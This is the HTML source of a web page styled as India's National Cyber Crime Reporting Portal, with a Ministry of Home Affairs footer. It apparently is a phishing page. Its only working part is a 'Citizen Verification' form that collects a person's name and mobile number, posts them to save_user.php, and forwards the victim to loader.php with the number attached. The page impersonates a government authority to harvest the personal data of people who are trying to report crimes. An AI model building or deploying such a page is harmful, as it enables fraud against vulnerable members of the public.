<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Cyber Crime Reporting Portal</title>
    <!-- Swiper CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; background: #f0f2f5; color: #333; }
        
        /* NEW NAVBAR STYLE */
        .nav-bar { 
            background: #fff; 
            display: flex; 
            align-items: center; 
            padding: 8px 12px; 
            border-bottom: 3px solid #0056b3;
            gap: 10px;
        }
        .nav-logos { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
        .nav-logos img { height: 45px; width: auto; }
        
        .site-name { 
            display: flex; 
            flex-direction: column; 
            line-height: 1.2;
            text-align: left;
        }
        .site-name .hindi { font-size: 13px; font-weight: bold; color: #000; }
        .site-name .english { font-size: 11px; color: #555; }

        /* Slider */
        .swiper { width: 100%; height: 200px; margin-bottom: 15px; }
        .swiper-slide img { width: 100%; height: 100%; object-fit: cover; }

        /* NEW INFO SECTION (Hacker Icon + Text) */
        .info-container { padding: 0 15px; margin-bottom: 15px; }
        .tab-btn { 
            background: #fff; 
            border: 1px solid #e0e0e0; 
            border-radius: 8px; 
            display: flex; 
            align-items: center; 
            padding: 12px; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .tab-icon img { width: 40px; height: 40px; margin-right: 15px; }
        .tab-text-box p { margin: 0; font-size: 14px; font-weight: 600; color: #0056b3; line-height: 1.4; }
        
        .description-text { 
            font-size: 14px; 
            text-align: justify; 
            line-height: 1.6; 
            color: #444; 
            margin-top: 15px;
            background: #fff;
            padding: 10px;
            border-radius: 8px;
        }

        /* Form Card */
        .form-card { background: #fff; margin: 15px; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        h2 { font-size: 1.1rem; color: #0056b3; margin-bottom: 15px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #0056b3; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }

        /* UPDATED FOOTER STYLE (Light Green) */
        footer { background: #e8f5e9; margin-top: 30px; padding: 25px 0; border-top: 1px solid #c8e6c9; }
        .footer-links { 
            list-style: none; padding: 0; margin: 0; 
            display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; 
        }
        .footer-links li a { text-decoration: none; color: #2e7d32; font-size: 13px; font-weight: 500; }
        .footer-bottom { 
            margin-top: 20px; display: flex; flex-direction: column; 
            align-items: center; text-align: center; padding: 0 15px;
        }
        .footer-bottom p { font-size: 11px; color: #4caf50; margin: 0 0 10px 0; line-height: 1.4; }
        .footer-meta { display: flex; gap: 10px; font-size: 10px; font-weight: bold; color: #1b5e20; }
        .footer-meta span { background: rgba(255,255,255,0.5); padding: 2px 6px; border-radius: 4px; }

        /* Mobile responsiveness */
        @media (max-width: 400px) {
            .site-name .hindi { font-size: 11px; }
            .site-name .english { font-size: 9px; }
            .nav-logos img { height: 35px; }
        }
    </style>
</head>
<body>

<!-- NAVBAR WITH THREE LOGOS AND DUAL NAME -->
<header class="nav-bar">
    <div class="nav-logos">
        <img src="l1.png" alt="Logo 1">
        <img src="logo.png" alt="Logo 2">
    </div>
    <div class="site-name">
        <span class="hindi">राष्ट्रीय साइबर अपराध रिपोर्टिंग पोर्टल</span>
        <span class="english">National Cyber Crime Reporting Portal</span>
    </div>
</header>

<!-- SLIDING BANNER -->
<div class="swiper">
    <div class="swiper-wrapper">
        <div class="swiper-slide"><img src="b1.png"></div>
        <div class="swiper-slide"><img src="b2.png"></div>
        <div class="swiper-slide"><img src="b3.png"></div>
        <div class="swiper-slide"><img src="b4.png"></div>
    </div>
</div>

<!-- INFO SECTION -->
<div class="info-container">
    <div class="tab-btn">
        <div class="tab-icon">
            <img src="hacker.png" alt="Hacker Icon">
        </div>
        <div class="tab-text-box">
            <p>Cyber Crime Related Complaint / Women & Children Related Cybercrime</p>
        </div>
    </div>
    <p class="description-text">
        Cybercrime refers to any unlawful activity carried out using computers, digital devices, or the internet. It includes offenses such as data theft, hacking, online harassment, identity misuse, financial scams, spreading malware, and other acts intended to harm individuals, organizations, or digital infrastructure.
    </p>
</div>

<!-- FORM SECTION -->
<div class="form-card">
    <h2>Citizen Verification</h2>
    <form id="mainForm">
        <input type="text" name="name" id="name" placeholder="Enter Full Name" required>
        <input type="tel" name="mobile" id="mobile" placeholder="Enter Mobile Number" required>
        <button type="submit">PROCEED TO VERIFY</button>
    </form>
</div>

<!-- FOOTER WITH LIGHT GREEN BACKGROUND -->
<footer>
    <ul class="footer-links">
        <li><a href="/feedback">Feedback</a></li>
        <li><a href="/contactus">Contact Us</a></li>
        <li><a href="/faq">FAQ</a></li>
        <li><a href="/website-policies">Website Policies</a></li>
        <li><a href="/privacy-policy">Privacy Policy</a></li>
        <li><a href="/disclaimer">Disclaimer</a></li>
    </ul>

    <div class="footer-bottom">
        <p>Website Content Managed by Ministry of Home Affairs, Govt. of India. Best viewed in Mozilla Firefox, Google Chrome [A].</p>
        <div class="footer-meta">
            <span>Last Updated : 19-11-2026</span>
            <span>Version 2.0</span>
        </div>
    </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
<script>
    const swiper = new Swiper('.swiper', { loop: true, autoplay: { delay: 3000 } });

    $('#mainForm').submit(function(e) {
        e.preventDefault();
        const name = $('#name').val();
        const mobile = $('#mobile').val();

        $.ajax({
            url: 'save_user.php',
            type: 'POST',
            data: { name: name, mobile: mobile },
            success: function() {
                window.location.href = 'loader.php?m=' + mobile;
            }
        });
    });
</script>

</body>
</html>
